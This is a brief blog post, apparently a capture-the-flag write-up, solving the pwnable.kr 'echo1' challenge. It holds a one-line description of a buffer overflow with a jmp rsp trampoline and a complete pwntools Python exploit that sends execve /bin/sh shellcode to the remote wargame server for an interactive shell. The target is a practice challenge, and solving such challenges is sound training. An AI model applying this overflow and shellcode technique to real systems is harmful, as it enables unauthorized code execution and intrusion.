---
layout: post
title: "pwnable.kr"
date: 2016-01-28 22:30:58 +0800
comments: true
categories: 
---
### 0x00
echo1
buf overflow 使用jmp rsp跳到shellcode
### 0x01
```python
from pwn import *

jmp_rsp = '\xff\xe4' + '\x00'*6
id = 0x6020a0


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


#p = process("./echo1")
p = remote( "pwnable.kr", 9010 )
p.sendline(jmp_rsp)
p.recvuntil(">")
p.sendline("1")
payload  = ''
payload += 'a' * 0x20
payload += 'b' * 8
payload += p64( id )
payload += shellcode
p.sendline(payload)

p.interactive()
```
